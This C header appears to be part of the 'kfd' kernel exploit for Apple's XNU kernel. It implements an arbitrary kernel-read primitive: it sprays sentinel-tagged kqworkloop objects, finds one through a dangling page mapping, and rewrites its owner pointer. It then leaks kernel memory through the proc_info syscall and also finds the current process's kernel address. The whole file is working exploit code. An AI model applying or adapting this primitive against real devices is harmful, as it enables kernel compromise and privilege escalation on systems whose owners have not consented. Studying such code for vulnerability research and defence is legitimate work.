/*
 * Copyright (c) 2023 Félix Poulin-Bélanger. All rights reserved.
 */

#ifndef kread_kqueue_workloop_ctl_h
#define kread_kqueue_workloop_ctl_h

const u64 kread_kqueue_workloop_ctl_sentinel = 0x1122334455667788;

u64 kread_kqueue_workloop_ctl_kread_u64(struct kfd* kfd, u64 kaddr);

void kread_kqueue_workloop_ctl_init(struct kfd* kfd)
{
    kfd->kread.krkw_maximum_id = 100000;
    kfd->kread.krkw_object_size = kfd_offset(kqworkloop__object_size);
}

void kread_kqueue_workloop_ctl_allocate(struct kfd* kfd, u64 id)
{
    struct kqueue_workloop_params params = {
        .kqwlp_version = (i32)(sizeof(params)),
        .kqwlp_flags = KQ_WORKLOOP_CREATE_SCHED_PRI,
        .kqwlp_id = id + kread_kqueue_workloop_ctl_sentinel,
        .kqwlp_sched_pri = 1,
    };

    u64 cmd = KQ_WORKLOOP_CREATE;
    u64 options = 0;
    u64 addr = (u64)(&params);
    usize sz = (usize)(params.kqwlp_version);
    assert_bsd(syscall(SYS_kqueue_workloop_ctl, cmd, options, addr, sz));
}

bool kread_kqueue_workloop_ctl_search(struct kfd* kfd, u64 object_uaddr)
{
    u64 sentinel_min = kread_kqueue_workloop_ctl_sentinel;
    u64 sentinel_max = sentinel_min + kfd->kread.krkw_allocated_id;

    u16 kqwl_state = uget_u64(kqworkloop__kqwl_state, object_uaddr);
    u64 kqwl_dynamicid = uget_u64(kqworkloop__kqwl_dynamicid, object_uaddr);

    if ((kqwl_state == (KQ_KEV_QOS | KQ_WORKLOOP | KQ_DYNAMIC)) &&
        (kqwl_dynamicid >= sentinel_min) &&
        (kqwl_dynamicid < sentinel_max)) {
        u64 object_id = kqwl_dynamicid - sentinel_min;
        kfd->kread.krkw_object_id = object_id;
        return true;
    }

    return false;
}

void kread_kqueue_workloop_ctl_kread(struct kfd* kfd, u64 kaddr, void* uaddr, u64 size)
{
    kread_from_method(u64, kread_kqueue_workloop_ctl_kread_u64);
}

void kread_kqueue_workloop_ctl_find_proc(struct kfd* kfd)
{
    u64 kqworkloop_uaddr = kfd->kread.krkw_object_uaddr;
    kfd->info.kaddr.current_proc = uget_u64(kqworkloop__kqwl_p, kqworkloop_uaddr);
}

void kread_kqueue_workloop_ctl_deallocate(struct kfd* kfd, u64 id)
{
    struct kqueue_workloop_params params = {
        .kqwlp_version = (i32)(sizeof(params)),
        .kqwlp_id = id + kread_kqueue_workloop_ctl_sentinel,
    };

    u64 cmd = KQ_WORKLOOP_DESTROY;
    u64 options = 0;
    u64 addr = (u64)(&params);
    usize sz = (usize)(params.kqwlp_version);
    assert_bsd(syscall(SYS_kqueue_workloop_ctl, cmd, options, addr, sz));
}

void kread_kqueue_workloop_ctl_free(struct kfd* kfd)
{
    kread_kqueue_workloop_ctl_deallocate(kfd, kfd->kread.krkw_object_id);
}

/*
 * 64-bit kread function.
 */

u64 kread_kqueue_workloop_ctl_kread_u64(struct kfd* kfd, u64 kaddr)
{
    u64 kqworkloop_uaddr = kfd->kread.krkw_object_uaddr;
    u64 old_kqwl_owner = uget_u64(kqworkloop__kqwl_owner, kqworkloop_uaddr);
    u64 new_kqwl_owner = kaddr - kfd_offset(thread__thread_id);
    uset_u64(kqworkloop__kqwl_owner, new_kqwl_owner, kqworkloop_uaddr);

    struct kqueue_dyninfo data = {};
    i32 callnum = PROC_INFO_CALL_PIDDYNKQUEUEINFO;
    i32 pid = kfd->info.env.pid;
    u32 flavor = PROC_PIDDYNKQUEUE_INFO;
    u64 arg = kfd->kread.krkw_object_id + kread_kqueue_workloop_ctl_sentinel;
    u64 buffer = (u64)(&data);
    i32 buffersize = (i32)(sizeof(struct kqueue_dyninfo));
    assert(syscall(SYS_proc_info, callnum, pid, flavor, arg, buffer, buffersize) == buffersize);

    uset_u64(kqworkloop__kqwl_owner, old_kqwl_owner, kqworkloop_uaddr);
    return data.kqdi_owner;
}

#endif /* kread_kqueue_workloop_ctl_h */
